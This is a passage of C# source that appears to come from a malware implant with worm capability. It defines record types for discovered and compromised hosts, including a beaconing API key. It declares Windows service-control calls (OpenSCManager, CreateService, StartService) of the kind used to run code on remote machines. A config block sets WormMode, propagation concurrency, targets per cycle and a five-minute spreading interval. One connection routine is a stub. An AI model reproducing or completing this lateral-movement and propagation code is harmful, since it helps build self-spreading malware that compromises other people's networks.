        public string Hostname;
        public string MAC;
        public string OS;
        public string OSVersion;
        public List<int> OpenPorts = new List<int>();
        public bool PortsScanned;
        public bool DomainJoined;
        public string Source;
        public string PivotHost;
    }

    private class CompromisedHost
    {
        public string IP;
        public string Hostname;
        public string OS;
        public bool DomainJoined;
        public DateTime CompromisedAt;
        public List<string> Techniques;
        public string ApiKey; // For beaconing
    }

    private class NetworkConnection : IDisposable
    {
        public string SharePath;
        public bool IsConnected;

        public NetworkConnection(string sharePath, NetworkCredential credentials)
        {
            SharePath = sharePath;
            // Would use WNetAddConnection2
            IsConnected = true;
        }

        public void Dispose() { }
    }

    // P/Invoke for service management
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool StartService(IntPtr hService, uint dwNumServiceArgs, string[] lpServiceArgVectors);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool CloseServiceHandle(IntPtr hSCObject);
}

internal static partial class Config
{
    public static bool WormMode = false;
    public static int MaxConcurrentPropagation = 10;
    public static int MaxTargetsPerCycle = 20;
    public static int PropagationIntervalMs = 300000; // 5 minutes
}